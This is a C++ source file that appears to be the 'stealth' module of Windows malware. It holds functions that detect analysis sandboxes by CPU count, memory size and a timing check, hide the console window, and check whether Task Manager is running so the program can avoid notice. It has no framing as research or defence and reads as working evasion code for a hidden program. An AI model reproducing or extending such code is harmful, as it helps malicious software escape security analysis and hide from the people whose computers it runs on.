#include "../../include/core/stealth.h"
#include <windows.h>
#include <vector>
#include <tlhelp32.h>

typedef BOOL (WINAPI *pGetSystemTimes)(PFILETIME, PFILETIME, PFILETIME);

bool IsSandbox() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 4) return true;

    MEMORYSTATUSEX status;
    status.dwLength = sizeof(status);
    GlobalMemoryStatusEx(&status);
    if (status.ullTotalPhys / (1024 * 1024) < 4096) return true;

    unsigned long long start = GetTickCount64();
    for (int i = 0; i < 10000000; i++) { }
    unsigned long long end = GetTickCount64();
    if ((end - start) < 1) return true; 

    return false;
}

void HideApp() {
    HWND window = GetConsoleWindow();
    if (window != NULL) {
        ShowWindow(window, SW_HIDE);
    }
}

bool IsTaskMgrOpen() {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry)) {
        while (Process32Next(snapshot, &entry)) {
            if (strcmp(entry.szExeFile, "Taskmgr.exe") == 0) {
                CloseHandle(snapshot);
                return true;
            }
        }
    }
    CloseHandle(snapshot);
    return false;
}